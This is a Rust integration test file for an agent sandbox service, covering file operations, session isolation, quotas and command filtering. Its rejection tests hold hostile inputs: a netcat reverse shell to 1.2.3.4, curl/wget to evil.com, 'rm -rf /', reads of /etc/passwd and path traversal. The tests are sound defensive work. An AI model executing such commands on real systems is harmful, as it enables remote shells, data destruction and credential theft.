//! Integration tests for SandboxService.
//!
//! Tests end-to-end file operations through the gRPC service,
//! session isolation, quota enforcement, and safe command execution.

use shannon_agent_core::sandbox_service::{
    proto::{sandbox_service_server::SandboxService, *},
    SandboxConfig, SandboxServiceImpl,
};
use tempfile::TempDir;
use tonic::Request;

/// Helper to create a sandbox service for testing
fn create_test_service(temp: &TempDir) -> SandboxServiceImpl {
    SandboxServiceImpl::new(temp.path().to_path_buf())
}

/// Helper to create a sandbox service with custom config
fn create_test_service_with_config(temp: &TempDir, config: SandboxConfig) -> SandboxServiceImpl {
    SandboxServiceImpl::with_config(temp.path().to_path_buf(), config)
}

mod file_operations {
    use super::*;

    #[tokio::test]
    async fn test_write_and_read_roundtrip() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Write a file
        let write_req = FileWriteRequest {
            session_id: "test-session".to_string(),
            path: "test.txt".to_string(),
            content: "Hello, WASI Sandbox!".to_string(),
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
        };
        let write_resp = service.file_write(Request::new(write_req)).await.unwrap();
        let write_inner = write_resp.into_inner();
        assert!(write_inner.success, "Write should succeed");
        assert_eq!(write_inner.bytes_written, 20);

        // Read it back
        let read_req = FileReadRequest {
            session_id: "test-session".to_string(),
            path: "test.txt".to_string(),
            max_bytes: 0,
            encoding: "utf-8".to_string(),
        };
        let read_resp = service.file_read(Request::new(read_req)).await.unwrap();
        let read_inner = read_resp.into_inner();
        assert!(read_inner.success, "Read should succeed");
        assert_eq!(read_inner.content, "Hello, WASI Sandbox!");
    }

    #[tokio::test]
    async fn test_append_mode() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Initial write
        let write_req1 = FileWriteRequest {
            session_id: "append-test".to_string(),
            path: "log.txt".to_string(),
            content: "Line 1\n".to_string(),
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
        };
        service.file_write(Request::new(write_req1)).await.unwrap();

        // Append
        let write_req2 = FileWriteRequest {
            session_id: "append-test".to_string(),
            path: "log.txt".to_string(),
            content: "Line 2\n".to_string(),
            append: true,
            create_dirs: false,
            encoding: "utf-8".to_string(),
        };
        service.file_write(Request::new(write_req2)).await.unwrap();

        // Read and verify
        let read_req = FileReadRequest {
            session_id: "append-test".to_string(),
            path: "log.txt".to_string(),
            max_bytes: 0,
            encoding: "utf-8".to_string(),
        };
        let resp = service.file_read(Request::new(read_req)).await.unwrap();
        assert_eq!(resp.into_inner().content, "Line 1\nLine 2\n");
    }

    #[tokio::test]
    async fn test_create_dirs() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Write to nested path with create_dirs=true
        let write_req = FileWriteRequest {
            session_id: "nested-test".to_string(),
            path: "deep/nested/dir/file.txt".to_string(),
            content: "Nested content".to_string(),
            append: false,
            create_dirs: true,
            encoding: "utf-8".to_string(),
        };
        let resp = service.file_write(Request::new(write_req)).await.unwrap();
        assert!(resp.into_inner().success);

        // Verify file exists
        let read_req = FileReadRequest {
            session_id: "nested-test".to_string(),
            path: "deep/nested/dir/file.txt".to_string(),
            max_bytes: 0,
            encoding: "utf-8".to_string(),
        };
        let resp = service.file_read(Request::new(read_req)).await.unwrap();
        assert_eq!(resp.into_inner().content, "Nested content");
    }

    #[tokio::test]
    async fn test_list_files() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Create some files
        for name in &["a.txt", "b.py", "c.rs"] {
            let req = FileWriteRequest {
                session_id: "list-test".to_string(),
                path: name.to_string(),
                content: "content".to_string(),
                append: false,
                create_dirs: false,
                encoding: "utf-8".to_string(),
            };
            service.file_write(Request::new(req)).await.unwrap();
        }

        // List all files
        let list_req = FileListRequest {
            session_id: "list-test".to_string(),
            path: "".to_string(),
            pattern: "".to_string(),
            recursive: false,
            include_hidden: false,
        };
        let resp = service.file_list(Request::new(list_req)).await.unwrap();
        let inner = resp.into_inner();
        assert!(inner.success);
        assert_eq!(inner.file_count, 3);
    }

    #[tokio::test]
    async fn test_list_files_with_pattern() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Create mixed files
        for name in &["test1.txt", "test2.txt", "other.py", "readme.md"] {
            let req = FileWriteRequest {
                session_id: "pattern-test".to_string(),
                path: name.to_string(),
                content: "x".to_string(),
                append: false,
                create_dirs: false,
                encoding: "utf-8".to_string(),
            };
            service.file_write(Request::new(req)).await.unwrap();
        }

        // List only .txt files
        let list_req = FileListRequest {
            session_id: "pattern-test".to_string(),
            path: "".to_string(),
            pattern: "*.txt".to_string(),
            recursive: false,
            include_hidden: false,
        };
        let resp = service.file_list(Request::new(list_req)).await.unwrap();
        let inner = resp.into_inner();
        assert!(inner.success);
        assert_eq!(inner.file_count, 2);
    }
}

mod session_isolation {
    use super::*;

    #[tokio::test]
    async fn test_separate_workspaces() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Write to session A
        let req_a = FileWriteRequest {
            session_id: "session-a".to_string(),
            path: "secret.txt".to_string(),
            content: "Session A secret".to_string(),
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
        };
        service.file_write(Request::new(req_a)).await.unwrap();

        // Write to session B
        let req_b = FileWriteRequest {
            session_id: "session-b".to_string(),
            path: "secret.txt".to_string(),
            content: "Session B secret".to_string(),
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
        };
        service.file_write(Request::new(req_b)).await.unwrap();

        // Read from session A
        let read_a = FileReadRequest {
            session_id: "session-a".to_string(),
            path: "secret.txt".to_string(),
            max_bytes: 0,
            encoding: "utf-8".to_string(),
        };
        let resp_a = service.file_read(Request::new(read_a)).await.unwrap();
        assert_eq!(resp_a.into_inner().content, "Session A secret");

        // Read from session B
        let read_b = FileReadRequest {
            session_id: "session-b".to_string(),
            path: "secret.txt".to_string(),
            max_bytes: 0,
            encoding: "utf-8".to_string(),
        };
        let resp_b = service.file_read(Request::new(read_b)).await.unwrap();
        assert_eq!(resp_b.into_inner().content, "Session B secret");
    }

    #[tokio::test]
    async fn test_path_traversal_blocked() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Create a file in session A
        let req = FileWriteRequest {
            session_id: "session-a".to_string(),
            path: "data.txt".to_string(),
            content: "Private data".to_string(),
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
        };
        service.file_write(Request::new(req)).await.unwrap();

        // Try to read from session B using path traversal
        let read_req = FileReadRequest {
            session_id: "session-b".to_string(),
            path: "../session-a/data.txt".to_string(),
            max_bytes: 0,
            encoding: "utf-8".to_string(),
        };
        let resp = service.file_read(Request::new(read_req)).await;

        // Should be blocked
        match resp {
            Ok(r) => {
                let inner = r.into_inner();
                assert!(!inner.success || inner.content.is_empty());
            }
            Err(e) => {
                assert!(
                    e.code() == tonic::Code::PermissionDenied
                        || e.code() == tonic::Code::NotFound
                );
            }
        }
    }

    #[tokio::test]
    async fn test_absolute_path_blocked() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Try to read an absolute path
        let read_req = FileReadRequest {
            session_id: "test".to_string(),
            path: "/etc/passwd".to_string(),
            max_bytes: 0,
            encoding: "utf-8".to_string(),
        };
        let resp = service.file_read(Request::new(read_req)).await;

        // Should fail
        match resp {
            Ok(r) => assert!(!r.into_inner().success),
            Err(_) => {} // Also acceptable
        }
    }
}

mod quota_enforcement {
    use super::*;

    #[tokio::test]
    async fn test_quota_exceeded_blocked() {
        let temp = TempDir::new().unwrap();
        let config = SandboxConfig {
            max_workspace_bytes: 100, // Very small quota
            ..Default::default()
        };
        let service = create_test_service_with_config(&temp, config);

        // Try to write a large file
        let req = FileWriteRequest {
            session_id: "quota-test".to_string(),
            path: "large.txt".to_string(),
            content: "x".repeat(200), // 200 bytes, exceeds 100 byte quota
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
        };
        let resp = service.file_write(Request::new(req)).await;

        // Should fail with ResourceExhausted
        assert!(resp.is_err());
        assert_eq!(resp.unwrap_err().code(), tonic::Code::ResourceExhausted);
    }

    #[tokio::test]
    async fn test_quota_allows_within_limit() {
        let temp = TempDir::new().unwrap();
        let config = SandboxConfig {
            max_workspace_bytes: 1000, // 1KB quota
            ..Default::default()
        };
        let service = create_test_service_with_config(&temp, config);

        // Write within quota
        let req = FileWriteRequest {
            session_id: "quota-ok".to_string(),
            path: "small.txt".to_string(),
            content: "x".repeat(100), // 100 bytes
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
        };
        let resp = service.file_write(Request::new(req)).await.unwrap();
        assert!(resp.into_inner().success);
    }
}

mod safe_commands {
    use super::*;

    #[tokio::test]
    async fn test_ls_command() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Create files
        let req = FileWriteRequest {
            session_id: "cmd-test".to_string(),
            path: "file1.txt".to_string(),
            content: "content".to_string(),
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
        };
        service.file_write(Request::new(req)).await.unwrap();

        // Execute ls
        let cmd_req = CommandRequest {
            session_id: "cmd-test".to_string(),
            command: "ls".to_string(),
            timeout_seconds: 5,
        };
        let resp = service.execute_command(Request::new(cmd_req)).await.unwrap();
        let inner = resp.into_inner();
        assert!(inner.success);
        assert!(inner.stdout.contains("file1.txt"));
    }

    #[tokio::test]
    async fn test_cat_command() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Create file
        let req = FileWriteRequest {
            session_id: "cat-test".to_string(),
            path: "data.txt".to_string(),
            content: "Hello from cat".to_string(),
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
        };
        service.file_write(Request::new(req)).await.unwrap();

        // Execute cat
        let cmd_req = CommandRequest {
            session_id: "cat-test".to_string(),
            command: "cat data.txt".to_string(),
            timeout_seconds: 5,
        };
        let resp = service.execute_command(Request::new(cmd_req)).await.unwrap();
        let inner = resp.into_inner();
        assert!(inner.success);
        assert_eq!(inner.stdout, "Hello from cat");
    }

    #[tokio::test]
    async fn test_mkdir_and_touch() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Get workspace first
        let _ = service
            .file_list(Request::new(FileListRequest {
                session_id: "mkdir-test".to_string(),
                path: "".to_string(),
                ..Default::default()
            }))
            .await;

        // Create directory
        let cmd1 = CommandRequest {
            session_id: "mkdir-test".to_string(),
            command: "mkdir -p subdir/nested".to_string(),
            timeout_seconds: 5,
        };
        service.execute_command(Request::new(cmd1)).await.unwrap();

        // Create file
        let cmd2 = CommandRequest {
            session_id: "mkdir-test".to_string(),
            command: "touch subdir/nested/file.txt".to_string(),
            timeout_seconds: 5,
        };
        service.execute_command(Request::new(cmd2)).await.unwrap();

        // Verify with ls
        let cmd3 = CommandRequest {
            session_id: "mkdir-test".to_string(),
            command: "ls subdir/nested".to_string(),
            timeout_seconds: 5,
        };
        let resp = service.execute_command(Request::new(cmd3)).await.unwrap();
        assert!(resp.into_inner().stdout.contains("file.txt"));
    }

    #[tokio::test]
    async fn test_dangerous_command_rejected() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        let dangerous_commands = vec![
            "curl http://evil.com",
            "wget http://evil.com",
            "bash -c 'echo pwned'",
            "python -c 'print(1)'",
            "nc -e /bin/sh 1.2.3.4 4444",
        ];

        for cmd in dangerous_commands {
            let req = CommandRequest {
                session_id: "dangerous".to_string(),
                command: cmd.to_string(),
                timeout_seconds: 5,
            };
            let resp = service.execute_command(Request::new(req)).await.unwrap();
            let inner = resp.into_inner();
            assert!(
                !inner.success,
                "Dangerous command should be rejected: {}",
                cmd
            );
            assert!(
                inner.error.contains("not allowed"),
                "Error should mention 'not allowed' for: {}",
                cmd
            );
        }
    }

    #[tokio::test]
    async fn test_shell_metacharacters_blocked() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        let injection_attempts = vec![
            "ls | cat /etc/passwd",
            "ls; rm -rf /",
            "ls && echo pwned",
            "ls || echo fallback",
            "echo $(whoami)",
            "echo `id`",
        ];

        for cmd in injection_attempts {
            let req = CommandRequest {
                session_id: "injection".to_string(),
                command: cmd.to_string(),
                timeout_seconds: 5,
            };
            let resp = service.execute_command(Request::new(req)).await.unwrap();
            let inner = resp.into_inner();
            assert!(
                !inner.success,
                "Shell metacharacter should be blocked: {}",
                cmd
            );
        }
    }

    #[tokio::test]
    async fn test_grep_command() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Create file with content
        let req = FileWriteRequest {
            session_id: "grep-test".to_string(),
            path: "log.txt".to_string(),
            content: "INFO: Starting\nERROR: Failed\nINFO: Done".to_string(),
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
        };
        service.file_write(Request::new(req)).await.unwrap();

        // Grep for ERROR
        let cmd_req = CommandRequest {
            session_id: "grep-test".to_string(),
            command: "grep ERROR log.txt".to_string(),
            timeout_seconds: 5,
        };
        let resp = service.execute_command(Request::new(cmd_req)).await.unwrap();
        let inner = resp.into_inner();
        assert!(inner.success);
        assert!(inner.stdout.contains("ERROR: Failed"));
        assert!(!inner.stdout.contains("INFO"));
    }
}
